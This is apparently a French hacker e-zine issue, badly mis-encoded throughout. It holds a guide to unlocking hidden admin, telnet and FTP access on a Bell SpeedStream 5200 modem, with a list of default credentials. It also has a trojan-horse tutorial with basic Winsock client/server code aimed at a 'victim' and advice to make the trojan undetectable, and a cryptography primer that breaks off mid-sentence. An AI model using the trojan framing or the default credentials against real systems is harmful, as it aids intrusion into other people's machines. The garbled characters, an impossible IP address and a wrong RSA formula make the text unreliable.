Il  semblerait  bien  que  Bell  ait lΓchΘ ses anciens modΦles de modems depuis dΘjα quelques 
temps,  et  qu'il remplacerait ceux-ci par des speadstream de efficient network. Cela est une 
bonne chose   en soit, les premiers 5200 avaient des bugs aprΦs quelques jours d?uptime, mais 
quelques patchs  ont  ΘtΘ  distribuΘes  pour corriger ces quelques bugs. Les 5200, α la base, 
sont des modems avec  des  router  intΘgrΘs, dans forwarder et dhcp server. Bell utilise  une 
version entiΦrement modifiΘe  du  firmware.  Cette version est semblable α l'originale,  sauf 
qu"elle affiche seulement les  paramΦtres  de  base  de  l'utilisateur,  soit l'adresse ip du 
modem,  sa  mac  adresse  et  le nom d'usager sympatico. Une autre nouveautΘ avec ces modems, 
c'est qu'on peut les utiliser en mode Route. Dans ce cas, le modem   se  connecte  au  rΘseau 
pppoe par lui-mΩme, et l'ordinateur connectΘ α celui-ci se  voit  attribuer  une  adresse  ip 
locale. C'est le mode par default quand on le reτoit. Je me disais donc  que s'il  pouvait le 
faire pour un ordi, on pourrait s√rement le configurer pour pouvoir connecter  plusieurs ordi 
dessus comme un router ordinaire. AprΦs un peu de recherche, j'ai  dΘcouvert  comment activer 
toutes les fonctions du modem dans l'interface web,  de  crΘer un utilisateur pour pouvoir se 
connecter α celui-ci en telnet, et mΩme en ftp.  On  peut Θgalement faire des tests de ligne, 
et avoir plusieurs stats sur la ligne et le rΘseau.  Ces  modems  supportent  aussi  le  mode 
bridge   (comme  les  autres  modems  adsl  normaux,   qui  nΘcessitent  un  client pppoe sur 
l'ordinateur voulant accΘder α internet). J'ai pu lire que des anciennes versions des 5200 ne 
supportaient pas d?interface web,  vous  pouvez  p-e  toutefois  quand mΩme vous connecter en 
telnet.

|->-=-,-.-  [ ::: Index ::: ] -<-=-,-.-|

1 L?interface Web
    1.1 Connexion α l?interface web
    1.2 Configurer les access.
    1.3 Configurer les pages α afficher.
    1.4 SΘcuritΘ du profile.
    1.5 Goto 1.2
    1.6 Access aux pages de configuration
    1.7 D?autres pages de conf moins importantes.

2 Connection α l?interface TELNET/FTP
    2.1 PrΘparation et configuration de l?adresse locale
    2.2 CrΘer un profil α utiliser pour connexion telnet/ftp
    2.3 Connexion en telnet
    2.4 Liste des commandes et options disponibles
    2.5 Variable pour d?autres version/model de modem.
    2.6 Si quelque chose tournait mal ?

3 Bye Bye
    3.1 Greetz


 Lets unlock it

1 [ ::: L?interface web ::: ]


Pour  dΘbloquer  l'interface  web,  vous  devez  vous  connecter  α  celui-ci   α   l'adresse 
http://192.168.2.1 α partir de n'importe quel ordinateur sur le mΩme rΘseau que le modem avec 
une adresse ip de la mΩme classe ( ou une adresse attribuΘe par  le  serveur  dhcp  du  modem 
activΘ par default)

1.1 [ ::: Connexion α l?interface web ::: ]

Allez sur cette page: http://192.168.2.1/pfwizardj.cgi?code=EDIT&id=prof0&retain=f

1.2 [ ::: Configurer les access ::: ]

Donc lα, vous avez le choix de mettre un mot de passe α l'utilisateur admin ou de le  laisser 
sans password comme par defaut. Cliquez sur next. Laissez cochΘ :DΘsactiver  complΦtement  le 
filtrage d'URL, α moins que vous dΘsiriez bloquer le pr0n de votre rΘseau.

1.3 [ ::: Configurer les pages α afficher ::: ]

AprΦs  avoir  appuyΘ  sur next, on voit bien ce qui nous intΘresse, c?est donc ici la page ou 
l'on peut ajouter toutes les options  α  l'interface web. Cochez  la  petite  case  Tous  les 
ΘlΘments et poursuivez avec suivant.

1.4 [ ::: SΘcuritΘ du profile ::: ]

AccΦs α la sΘcuritΘ du profil, laissez par default Ne pas demander l'identification admin, si 
vous  voulez  le  modifier, faites-le par la suite quand vous aurez terminΘ de dΘbarrer votre 
5200. Cliquer sur next, et ne mettez pas d?adresse ip dans la case, passez α la page suivante 
avec next, vous pouvez voir que l?assistant a terminΘ son travail, cliquez sur terminer.


1.5 [ ::: Goto 1.2 ::: ] 

└ ce point, vous pouvez aller sur http://192.168.2.1/, mais vous allez vite voir  que  τa  ne 
marche    pas    encore,    il    reste    quelques    Θtapes!    Retournez    α    l'adresse 
http://192.168.2.1/pfwizardj.cgi?code=EDIT&id=prof1&retain=f et faites exactement  les  mΩmes 
setting qu?aux Θtapes prΘcΘdentes, sauf que cette fois-ci rendu α  Adresse  IP  constante  du 
profil,  cette  fois-ci,  mettez  l'adresse  ip  de  votre machine avec laquelle  vous tentez 
d'accΘder   aux   configurations.   Poursuivez   l'assistant   comme   ΘnoncΘ lors des Θtapes 
prΘcΘdentes. 

1.6 [ ::: Access aux pages de configuration ::: ] 
 
Votre  interface  web  est  maintenant  dΘbarrΘ  et  vous  avez  accΦs  α  plusieurs sections 
supplΘmentaires.  Il  manque toujours quelques outils pour pouvoir utiliser votre modem comme 
router, voici les liens directs pour pouvoir configurer chaque service:

╗192.168.2.1/dhcpcfg.htm - DHCP
╗192.168.2.1/ddnscfg.htm - Dynamic DNS
╗192.168.2.1/ipp_config.htm - IP Passthru
╗192.168.2.1/updatelocal.htm - Update firmware
╗192.168.2.1/ras_config.htm - RAS config
╗192.168.2.1/naptcfg.htm - Port forwarding
╗192.168.2.1/dmzcfg.htm - DMZ Config
╗192.168.2.1/fwcfg.html - Firewall Config
╗192.168.2.1/fwwizard.htm - Firewall Config Wizard
╗192.168.2.1/natcfg.htm - NAT/NAPT Configuration
╗192.168.2.1/hostcfg.html - Host Configuration
╗192.168.2.1/upnpcfg.html - UPNP Configuration
╗192.168.2.1/ripcfg.html - RIP Configuration
╗192.168.2.1/adscfg.htm - FW Attack Detection System
╗192.168.2.1/snoozecfg.htm - Firewall Snooze Control
╗192.168.2.1/lansrvscfg.htm - Gateway Server Port Config


Tout  a  trΦs  bien  marcher dans mon cas, et les setting du firewall, nat et portforwarding 
semble bien fonctionner. 

1.7 D?autre page accessible: 
╗192.168.2.1/pflogin.htm
╗192.168.2.1/vcwizardj.cgi?code=HOME
╗192.168.2.1/hostcfg.htm
╗192.168.2.1/dhcpcfg.htm
╗192.168.2.1/user.htm
╗192.168.2.1/timecfg.htm
╗192.168.2.1/statroute.htm
╗192.168.2.1/natcfg.htm
╗192.168.2.1/naptcfg.htm
╗192.168.2.1/fwcfg.htm
╗192.168.2.1/snoozecfg.htm
╗192.168.2.1/dmzcfg.htm
╗192.168.2.1/fwwizardj.cgi?code=HOME
╗192.168.2.1/fwlogshow.htm
╗192.168.2.1/adscfg.htm
╗192.168.2.1/upnpcfg.htm
╗192.168.2.1/rfc2684cfg.htm
╗192.168.2.1/brgmode.htm
╗192.168.2.1/ripcfg.htm
╗192.168.2.1/lansrvscfg.htm
╗192.168.2.1/ddnscfg.htm
╗192.168.2.1/summary.htm
╗192.168.2.1/syslogshow.htm
╗192.168.2.1/atmstatsx.htm
╗192.168.2.1/dslstatsx.htm
╗192.168.2.1/ethstatsx.htm
╗192.168.2.1/usbstatsx.htm
╗192.168.2.1/routestatsx.htm
╗192.168.2.1/reboot.htm


2. [ ::: Telnet et FTP ::: ]

Vous voulez peut-Ωtre aller plus loin ? Les  speedstream  5200  ont  par default  un  serveur 
telnet et un ftp pour pouvoir configurer le modem ou bien lui envoyer des datas.  Voici  donc 
la  marche  α  suivre  pour  crΘer  un  utilisateur pouvant se connecter au telnet/ftp de ces 
modems.

2.1 [ ::: PrΘparation et configuration de l?adresse locale ::: ]

Pour  accΘder  aux ressources telnet du modem, vous devez avoir comme adresse ip 192.168.2.2, 
sinon le port est filtrΘ et la connection est impossible.

2.2 [ ::: CrΘer un profil α utiliser pour connexion telnet/ftp ::: ] 

Dirigez vous vers: http://192.168.2.1/pfwizardj.cgi?code=EDIT&id=prof1&retain=f Et  entrez un 
mot de passe α l'utilisateur mfadmin, faites les mΩmes dΘmarches que tant⌠t  lors des setting 
pour l'interface web, rendu α Adresse IP constante du profil, vous pouvez entrer l'adresse ip 
de votre machine, et quelques fois τa arrive  que vous puissiez vous connecter au telnet avec 
cette ip sans utiliser 192.168.2.2.

2.3 [ ::: Connexion en telnet ::: ] 

Donc vous pouvez faire: telnet 192.168.2.1 ou ftp 192.168.2.1 α partir de votre os favorit et 
entrez dans l'administration telnet du modem α l'aide du nom d'utilisateur et du mot de passe 
que vous avez spΘcifier α l'Θtape 2.2 

2.4: [ ::: Liste des commandes et options disponibles ::: ] 

Voici quelques commandes que j?ai copiΘ α partir d?un site anglais: 
Toutes ces options doivent Ωtre prΘcΘdΘes de une de ces 3 commandes:

do
clear
show
cfg

Ex: show net iface

flash -- non program flash, suggest not to touch it
cfg stat -- ability to "show" information on device. Includes devices infomation
dhcpc -- shows stats for clients connected via DHCP
arp -- arp table information
buff -- buffer information
iface -- shows interface information, think ifconfig (linux/unix)
stat -- equivelent of netstat
routes -- show route table
ppp -- shows ppp connections, oe01 is USB, oe00 is enet, includes current IP address
ipfw -- very basic firewall
stat -- show stats, such as rejects
log -- shows log, usally blank
dmz -- NOTE THIS: The 192.168.2.2 is in DMZ-- Firewall DMZ is enabled,
rules - show a non-easy-to-read ip table
napt -- Network Application Tunneling?
map -- shows the maping
servers -- blank during testing dsl
stat -- show line stats, including current profile
ber -- shows data rate for channels?
log -- error logs
tones -- test disabled
bins -- table printed out with stars, do not know what exactly it means (sorry)
brg -- show bridge more information
map -- show bridge map table
dhcp -- no entries in database
eth -- show information about ethernet connection
stat -- shows the line stats obviously
dhcp -- no entries in database
usb -- show information about usb connection
stat -- show line stats
dhcp -- no entries
atm stat -- show atm stats
2684
iface -- show stats about the device
2364
iface -- show stats about the device
ads -- show stats on the ads info. See * below
l2xp -- won't go through, exact same but one level deeper
flash
cfg
dhcpc
net
ipfw
napt
dsl
brg
eth
usb
atm
2684
2364
ads
l2xp
upnp
dnsrelay
firmware
sys
upnp -- shows universal network plug n play info
dnsrelay 
stat -- line stats
ber -- ber info again
log -- dsl log again
tones -- disables
bins -- again the star things
firmware -- DO NOT USE THIS, it is a command line upgrade option. Great Danger
sys -- show system info
memory -- show memory usage
versions -- firmware information
cpu -- show cpu usage
uptime -- total uptime in seconds
dma -- not implemented
log -- show system log, what has been done since last update
userlog -- if you enable differnt users (can't in this version of the firmware) 
           log information goes here
└ noter que vous devez parfois faire: show le_group la_command ex: show net arp


2.5 [ ::: Variable pour d?autres version/model de modem ::: ] 

Quelques variables pour des anciennes versions des 5200 utilisent comme adresse  ip  10.0.0.1 
et  que vous devez donc modifier votre machine pour vous connecter aux interfaces avec une ip 
de la mΩme classe que le modem.

Pour les access telnet/web/ftp, par default on retrouve des fois les utilisateur/passwd: 
admin/admin
admin1/admin
bcadmin/bcadmin
mfadmin/mfadmin
B1VOTRE_USER_SYMPATICO/VOTRE_PASSWD

2.6 [ ::: Si quelque chose tournait mal ::: ] 

Si jamais quelque chose tournait mal, vous pouvez reseter votre modem en appuyant 4  secondes 
avec  quelque  chose  sur  la petite switch reset α l'endos du modem, et notez bien que cette 
procΘdure peut marcher  pour  d'autres modems que les 5200, et peut aussi ne pas marcher avec 
quelques 5200, tenez moi α jour de l'utilisation sur d?autres modems.


3.0 [ ::: Bye Bye ::: ]

En espΘrant que τa ait bien marchΘ pour vous, et si vous trouvez d'autres options/faτons plus 
simple, pour  ce  modem ou d'autres, postez nous votre savoir, c'est la seule faτon de garder 
le site/zine α jour et de continuer α dΘvelopper de nouvelles connaissances.

3.1 [ ::: Greetz to ::: ]

Www.dslreports.com               Pour m'avoir donner beaucoup d?info sur le speedstream 5200.
Ma blonde mary@pyrofreak.org     Pour avoir corrigΘ le document.
Patoff    patoff@pyrofreak.org   Pour avoir rajoutΘ de l'info + un beau ascii et m?avoir 
                                 poussΘ α faire ce doc.
 
 
  
  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |&lt;freakguy> L'autre jour jme demandais ca dans ma tete     \\_  \_ \   \\_ M  ; . X
 || |&lt;freakguy> si les filtreur de piscine cetais pas des      \_ \   \\_  \_ \ K      
 || |&lt;freakguy> ΘmΘteurs du projet mk-ultra dla cia et des       \\_  \_ \   \\_ -  : '
 ||`|&lt;freakguy> illuminati, franc macon, opus dei, gang a binf!! \_ \   \\_  \_ \ 1   
 || |&lt;freakguy> ca fait peur !! pensez y c'est machine la on       \\_  \_ \   \\_ 1  + 
 || |&lt;freakguy> le droit de faire un bruit etrange et puis suffit  \_ \   \\_  \_ \ 1   
 ||'|&lt;freakguy> que votre voisin sachete une piscine pour que vos    \\_  \_ \   \\_  x 
 || |&lt;freakguy> obligation(femme/enfant/chien/chat/votre mere ?) se  \_ \   \\_  \_ \  `
 || |&lt;freakguy> mettre a vous suplier pour en avoir une aussi!!!       \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ SantΘ et parano canada prΘsente...                                    ]=\:\  |
  \__\__________________________________________________________________________________/ 



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[16]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ les bases d'un cheval de troie] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:                                                           ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[   fluxius    ]=\:\ _//     
                                                  \__\________________________/__/ 



              0001001000000100000001001000001000000100010000000000010
              010      __  __           __  _____                 000 
              000     / / / /___ ______/ /_|__  /   _____  ____   001  
              001    / /_/ / __ `/ ___/ //_//_ < | / / _ \/ ___/  010
              000   / __  / /_/ / /__/ ,< ___/ / |/ /  __/ /      000
              000  /_/ /_/\__,_/\___/_/|_/____/|___/\___/_/       001
              010            http://hackever.n0ne.org             000
              0100010001000000100001001000001001000000010000010000100


Introduction :

Un  cheval de troie dit Troyen en d'autre thermes est un programme qui ouvre grand les portes 
de votre systΩme.

Histoire :
Le nom "Cheval de Troie" provient d'une lΘgende narrΘe dans l'Iliade (de l'Θcrivain HomΦre) ├á 
propos du siΩge de la ville de Troie par les Grecs. La lΘgende veut que les Grecs, n'arrivant 
pas ├á pΘnΘtrer  dans les fortifications de la ville, eurent l'idΘe de construire  un  Θnorme 
cheval  de  bois  pour  s'y  cacher  en faisant croire qu'ils avaient abandonnΘ le siΩge. Les 
troyens  (peuple  de  la ville de Troie), heureux de voir le siΩge vide ramenΦre le cheval de 
bois comme  prix de leur victoire dans les murs de la ville. Cependant le cheval Θtait rempli 
de soldats  cachΘs qui s'empressΦrent d'en sortir ├á la tombΘe de la nuit, alors que la ville 
entiΦre Θtait  endormie,  pour  ouvrir les portes de la citΘ et en donner l'accΦs au reste de 
l'armΘe ...

Si vous Ωtes interessez par le "film"...

Le  cheval  de  troie  peut  causer  pas  mal de soucis : vol de mots de pass, destruction du 
systΩme... Nous allons vous expliquer  par  Θtape ce qu'est un troyen et vous donner quelques 
bases pour en programmer  un.  C'est  pas  gΘnial ! :-P.  Ce  tuto  traitera  le  cas   d'une 
programmation sur Windows.

Les bases

Le cheval de troie est ensemble de deux programme : Un Server et Un Client

Le  serveur  est justement le cheval qui va nous permettre d'entrer dans  le  systΦme  de  la 
victime  pour le sacager. Le client lui communiquera avec le serveur pour libΘrer les soldats 
du Cheval  (Faut bien leur faire prendre l'air).

Attention ! :
Avant  de  rΘaliser  quoi  que ce soit, je vous prΘviens simplement que des bases en C++ vous 
seront  nΘcessaire.  Les  explications  qui  suivent vous permettrons juste de savoir comment 
communique  un  serveur  et  un  client pour attribuer par la suite des fonctions relative au 
hack.

Pour commencer, nous alons rΘaliser un serveur qui permettra de faire notre client.

Voici un exemple :
  __________________________________________________________________________________
 |                                                                                 | 
 | server.cpp                                                                      |
 |_________________________________________________________________________________| 
________________________________________________________________________________________________
#include &lt;winsock.h>
#include &lt;iostream.h>

void main()
{
WSADATA WSAData;
WSAStartup(MAKEWORD(2,0),&WSAData);
	
SOCKET sock;
SOCKET csock;
SOCKADDR_IN sin;
SOCKADDR_IN csin;

sock = socket(AF_INET, SOCK_STREAM, 0);

sin.sin_addr.s_addr			= INADDR_ANY;
sin.sin_family				= AF_INET;
sin.sin_port				= htons(6667); // Le server ouvre le port 6667

bind(sock, (SOCKADDR *)&sin, sizeof(sin));
listen(sock, 0);

		while(true)
		{
			int sinsize = sizeof(csin);
			if((csock = accept(sock,(SOCKADDR *)&csin,&sinsize)) != INVALID_SOCKET)
			{ // si tout c'est bien pass├⌐ 
			send(csock,"Welcome on\n82.422.322.1 in port 6667\r\n\r\n",50,0);
			}
        }

closesocket(sock);
WSACleanup();
}
____________________________________________________________________________________________________


Une  Socket  est  une  interface  de  programmation  utilisΘ chez UNIX. Microsoft lui utilise 
winsock voil├ád'o∙ vient #include &lt;winsock.h> si vous ne le saviez pas encore.

Maintenant nous avant notre serveur, il ne reste plus qu'├á coder notre client.

Et voil├á un exemple :
  _____________________________________________________________________________
 |                                                                             |
 |    client.cpp                                                               |
 |_____________________________________________________________________________|
_________________________________________________________________________________________________
 
#include &lt;stdio.h>
#include &lt;iostream.h>
#include &lt;winsock.h>
#include &lt;conio.h> 

void main() 
{
  WSADATA WSAData;
  WSAStartup(MAKEWORD(2,0),&WSAData);
  SOCKADDR_IN sin;
  SOCKET sock;
  char buffer[665];
  sock = socket(AF_INET,SOCK_STREAM,0);
    
  sin.sin_addr.s_addr = inet_addr("82.422.322.1"); // ip de  la victime 
  sin.sin_family      = AF_INET; 
  sin.sin_port        = htons(6667); // Port de communication

  connect(sock, (SOCKADDR *)&sin, sizeof(sin)); // Connection  au serveur
  memset(buffer,0,665);
    int i = recv(sock, buffer, sizeof(buffer),0);
    if (i != false)
    {
    printf("%s",buffer);
    }
getch();
closesocket(sock);
WSACleanup();

getchar();
}

_____________________________________________________________________________________________________


Cel├á ├á l'air dΩtre un tutorial sur les sockets me direz vous, mais non pas seulement, c'est 
justement  la  base d'un troyen. Les deux codes ci-dessus montre la faτon de faire un serveur 
et un  client et ├á partir de cel├á vous pourrez ajouter vos fonction selon votre utilisation 
comment  par  exemple "fopen" qui permet de lire et ecrire dans un fichier, en fin tout plein 
de choses.

Voil├á maintenant il n'y a pas de secrets sur les troyens en C. Il suffit d'en coder :-P

Pour les dΘbutants
Je vous conseil soit de vous mettre au C ou sinon : Rendre votre troyen prΘcoder, indetectable. 
Good Luck !

  e-zine by ----x[FlUxIuS]x-----> <<<[(-_-)]>>>

                               (c) Hack3ver - All rights reversed.



  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |                                                            \\_  \_ \   \\_ -  : '
 ||`|                                                            \_ \   \\_  \_ \ 1   
 || |Vous etes un vrai hacker et vous pensez etre ben stealth?     \\_  \_ \   \\_ 1  + 
 || |http://ghh.sf.net, Google Hack Honeypot project , Runner en un\_ \   \\_  \_ \ 1   
 ||'|devener un paria today :)                                       \\_  \_ \   \\_  x 
 || |                                                                \_ \   \\_  \_ \  `
 || |                                                                  \\_  \_ \   \\_  
 ||,|                                                                  \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |                                                                    \_ \   \\_/    \
 / ;|                                                                      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Google Hack Honeypot Project                                          ]=\:\  |
  \__\__________________________________________________________________________________/ 

  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[17]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ un affaire de cryptographie   ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:  ñhZi7ZlyvWYTma0kOQTy6LgFS0UZN                            ]=\:\  \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[     steck    ]=\:\ _//     
                                                  \__\________________________/__/ 


Introduction α la cryptographie

Dans cet article je vais expliquer les bases de la cryptographie. Je ne  vais  pas  dΘtailler 
les algorithmes, je vais juste les citer pour que vous puissiez demander  α  votre ami google 
si vous voulez plus de renseignements.

Tout  d'abord  commenτons  par  quelques  dΘfinitions pour mettre tout le monde d'accord.  La 
cryptographie est la science de garder des messages secrets, la cryptologie  est  la  branche 
mathΘmatique qui s'en charge, et la cryptanalyse est  la  science  de  retrouver  le  message 
original sans en avoir la clΘ.

Un texte clair, aprΦs chiffrement ou encryption, devient un texte chiffrΘ  ou   cryptogramme. 
Celui ci redeviendra un texte clair aprΦs dΘchiffrement ou dΘcryptage.

Les deux protagonistes qui veulent s'Θchanger un message sont appelΘs Alice et Bernard.

La sΘcuritΘ d'un algorithme ne doit pas dΘpendre de la non connaissance de cet algorithme, au 
contraire il doit Ωtre approuvΘ et testΘ par la communautΘ afin de 
trouver des failles.

On  distingue  deux  types  principaux   d'algorithmes : les algorithmes α clΘ secrΦte et les 
algorithmes α clΘ publique.

LES ALGORITHMES A CLE SECRETE

La mΩme clΘ est utilisΘe pour chiffrer et dΘchiffrer les messages, et doit donc n'Ωtre connue 
que par les personnes impliquΘes. Si une personne avec la clΘ  obtient  un  message  chiffrΘ, 
elle pourra la dΘchiffrer sans que les autres personnes ne s'en  rendent  compte. La sΘcuritΘ 
du message dΘpend uniquement du nombre de personnes connaissant la clΘ.

Ce type d'algorithme est le plus souvent utilisΘ pour le chiffrement de fichiers sur  disque. 
L'ancien standard Θtait  le  DES  (Data  Encryption  Standard),  depuis  peu  un  nouveau l'a 
remplacΘ, l'AES (Advanced Encryption Standard).

Il y a deux types de chiffrement α clΘ privΘe : le chiffrement en continu,  qui  chiffre  bit 
par bit (ou lettre par lettre), et le chiffrement par blocs, qui dΘcoupe  le  texte  en blocs 
(souvent 64 bits) et chiffre blocs par blocs (Θventuellement en  fonction  du  bloc prΘcΘdent 
pour plus de sΘcuritΘ).

Dans  cette  catΘgorie  on  retrouve  tous  les algorithmes α substitution simple (lettre par 
lettre, comme le code de cΘsar ou la rotation 13), α substitution homophonique  (α  une  mΩme 
lettre correspond plusieurs  lettres  chiffrΘes),  toutes  leurs  variantes  et  compositions 
(plusieurs substitutions en sΘries, substitution par blocs de 3,  VigenΦre,  ENIGMA...).  Ces 
algorithmes ne cachent pas assez les caractΘristiques de  la  langue  utilisΘe et sont perdus 
face α une attaque statistique (basΘe sur la frΘquence d'apparition des lettres). On retrouve 
aussi les algorithmes α transposition, o∙ c'est juste la place des lettres qui change, et qui 
se cassent aussi trΦs facilement.

Dans les "vrais" algorithmes, outre le DES et l'AES, on peut citer l'IDEA,  Skipjack,  RC5... 
et le masque jetable (utilisation du OU EXCLUSIF, qui est rΘellement incassable si la clΘ est 
de la longueur du texte et ne peut pas Ωtre devinΘe... La  gΘnΘration  des nombres alΘatoires 
est cruciale en cryptographie).

On considΦre actuellement que la taille suffisante des clΘs secrΦtes est de 128 ou  256 bits, 
selon les algorithmes.

Voici comment fonctionne en gros DES (AES, dont le vrai nom de l'algorithme est Rijndael, est 
nettement plus compliquΘ) :

Le texte est dΘcoupΘ en blocs de 64 bits. AprΦs une permutation initiale, le bloc est  divisΘ 
en deux blocs de 32 bits. Ensuite vient 16 rondes d'une mΩme fonction qui  combine  ces blocs 
avec la clΘ de 56 bits. Ensuite ces blocs sont rassemblΘs et  une  derniΦre permutation donne 
le bloc final.  C'est  le  mΩme  algorithme  qui  est  utilisΘ  pour  le  chiffrement  et  le 
dΘchiffrement, en inversant simplement la clΘ. Les  opΘrations  dans  la  fonction  sont  des 
dΘcalages de bits, des permutations, des ou exclusifs avec certaines parties de la clΘ et des 
substitutions.

La sΘcuritΘ du DES a ΘtΘ testΘe et approuvΘe aprΦs des annΘes d'Θtudes. Il n'y a que  4  clΘs 
dites faibles qui rendent l'algorithme peu s√r et 60 autres sont semi-faibles.  Mais il reste 
quand mΩme 72 057 594 037 927 872 autres clΘs tout α fait valables. Une  attaque  pour tester 
toutes  le  clΘs  ne  devrait  en  fait tester la moitiΘ des clΘs possibles (2^55 au lieu des 
2^56). En 1993 fut conτue une machine α 1 million  de  dollars  qui  peut  faire  une attaque 
exhaustive contre le DES en 3.5 heures. De nos jours le DES n'est plus utilisΘ mais une telle 
machine actuellement le ferait en quelques minutes et pour bien moins cher.

Pour amΘliorer la sΘcuritΘ du DES il y a eu des variantes comme le DES triple : trois  DES  α 
la suite avec trois clΘs diffΘrentes 

LES ALGORITHMES A CLE PUBLIQUE

Dans ces algorithmes, une clΘ diffΘrente est utilisΘe pour chiffrer et pour  dΘchiffrer.  Une 
partie  de  la clΘ est connue de vous seul, et une partie est publique, accessible  au  monde 
entier, dans un rΘpertoire de clΘs.

Ainsi  si  quelqu'un veut vous envoyer un message, il le chiffre avec votre clΘ publique,  et 
vous seul pourra le dΘchiffrer.

On  peut  Θgalement  chiffrer  un  message  avec  sa  clΘ  privΘe, et tout le monde pourra le 
dΘchiffrer.

Ce type d'algorithme permet de rΘsoudre d'autres problΦmes liΘs aux transferts de 
donnΘes :
- l'authentification : Si Alice veut envoyer un message α Bernard, avant de le chiffrer  avec 
  la clΘ publique de Bernard, elle le chiffre avec sa clΘ privΘe. Ainsi  Bernard  recevra  un 
  message qu'il dΘchiffrera avec sa clΘ privΘe, puis dΘchiffrera le message  obtenu  avec  la 
  clΘ publique d'Alice pour obtenir le message d'origine. Etant donnΘ  que  le  message a ΘtΘ 
  chiffrΘ avec la clΘ privΘe d'Alice, il peut Ωtre certain que le message provient d'elle. Ce 
  procΘdΘ s'appelle Signer le message.
- l'intΘgritΘ :  En  signant  son  message,  il  n'y  a que Alice et Bernard qui ont accΦs au 
  message clair, donc personne ne peut le modifier, car  il  lui  faudrait  possΘder  une clΘ 
  privΘe.
- le non dΘsaveu : Toujours en signant son message, Alice ne peut  pas  nier  dans  le  futur 
  l'avoir envoyΘ.

C'est ce type d'algorithmes qui sont utilisΘs pour les transferts bancaires ou  sur  internet 
(SSL, SSH...), et la longueur des clΘs respectable est des 2048 bits minimum.

Les  principaux  algorithmes  sont  RSA,  Rabin,  ElGamal,  et  repose sur des impossibilitΘs 
mathΘmatiques (factorisation de produit de grands nombres premiers, calculs de racines carrΘs 
modulo un nombre composite, calculs de logarithmes discrets...)

Voici le fonctionnement de RSA (Rivest Shamir Adleman) :

prenons deux grands nombres premiers p et q (plus de 100 chiffres chacun)
posons n=p*q et m=(p-1)(q-1) et choisissons e premier avec m.
il suffit enfin de trouver un nombre d vΘrifiant e*d=1 modulo n
Le couple (n,e) est la clΘ publique accessible α tout le monde, et (n,d) la clΘ privΘe.
Pour chiffrer un message, il faut le dΘcouper par blocs (pour Θviter d'obtenir au final 
